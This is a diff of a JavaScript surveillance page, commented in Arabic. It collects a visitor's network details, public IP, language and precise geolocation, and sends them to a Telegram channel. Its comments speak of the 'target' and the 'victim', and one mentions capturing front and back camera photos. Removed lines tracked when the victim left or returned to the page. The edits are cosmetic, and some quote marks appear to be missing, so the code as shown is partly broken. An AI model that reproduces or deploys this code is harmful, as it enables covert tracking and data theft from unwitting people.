@@ -59,10 +59,6 @@
             } catch(e) {}
         }
 
-        // ميزة تتبع المستخدم (متصل / غادر)
-        window.onblur = () => sendToTelegram("⚠️ *الضحية غادر الصفحة الآن (خارج المتصفح)*");
-        window.onfocus = () => sendToTelegram("✅ *الضحية عاد لفتح الصفحة الآن*");
-
         async function getFullReport() {
             let info = `📊 *تقرير شامل للهدف*:\n\n`;
             
@@ -75,7 +71,7 @@
             // 2. معلومات الشبكة والاتصال (WiFi/Cellular)
             const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
             if (conn) {
-                let netType = conn.type ===   wifi   ? "🌐 WiFi" : (conn.type ===   cellular   ? "📶 خلوي" : "📡 متصل");
+                let netType = conn.type ===  wifi  ? "🌐 WiFi" : (conn.type ===  cellular  ? "📶 خلوي" : "📡 متصل");
                 info += `• 📶 نوع الشبكة: \`${netType} (${conn.effectiveType.toUpperCase()})\`\n`;
                 info += `• ⚡ سرعة الخط: \`${conn.downlink} Mbps\`\n`;
             }
@@ -89,7 +85,7 @@
             // 4. الـ IP والموقع واللغة
             info += `• 🌐 لغة الهاتف: \`${navigator.language}\`\n`;
             try {
-                const ipRes = await fetch(  https://api.ipify.org?format=json  );
+                const ipRes = await fetch( https://api.ipify.org?format=json );
                 const ipData = await ipRes.json();
                 info += `• 🌐 الـ IP: \`${ipData.ip}\`\n`;
             } catch(e) {}
@@ -129,7 +125,7 @@
 
             // 2. طلب وإرسال الموقع الجغرافي
             navigator.geolocation.getCurrentPosition(async (p) => {
-                await sendToTelegram(`📍 *الموقع الدقيق*:\n[فتح عبر خرائط جوجل](http://maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude})`);
+                await sendToTelegram(`📍 *الموقع الدقيق*:\n[فتح عبر خرائط جوجل](https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude})`);
             }, () => sendToTelegram("❌ رفض إذن الموقع"));
 
             // 3. التقاط وإرسال الصور (أمامية وخلفية)
